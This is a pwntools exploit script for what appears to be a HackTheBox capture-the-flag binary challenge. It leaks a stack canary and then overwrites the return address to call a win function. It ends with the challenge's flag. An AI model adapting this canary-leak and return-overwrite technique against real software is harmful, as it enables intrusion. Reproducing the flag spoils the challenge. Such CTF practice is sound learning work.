from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-pwndbg
b*0x00000000004015C4
continue
'''.format(**locals())

libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
exe = './quack_quack_patched' #change this
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

payload1 = flat(
    b"A" * 89,
    b"Quack Quack ",
    )

io.sendlineafter(b'>', payload1)
io.recvuntil(b'Quack Quack ')
leaked_canary = u64((io.recv(8)[:-1]).rjust(8, b'\x00'))

payload2 = flat(
    b"A" * 88,
    leaked_canary,
    b'A' * 8,
    elf.sym.duck_attack
    )

io.sendlineafter(b'>', payload2)
# log.info(hex(leaked_canary))

io.interactive()

#HTB{~c4n4ry_g035_qu4ck_qu4ck~_3b334c837cfb7047a29916c620a7083b}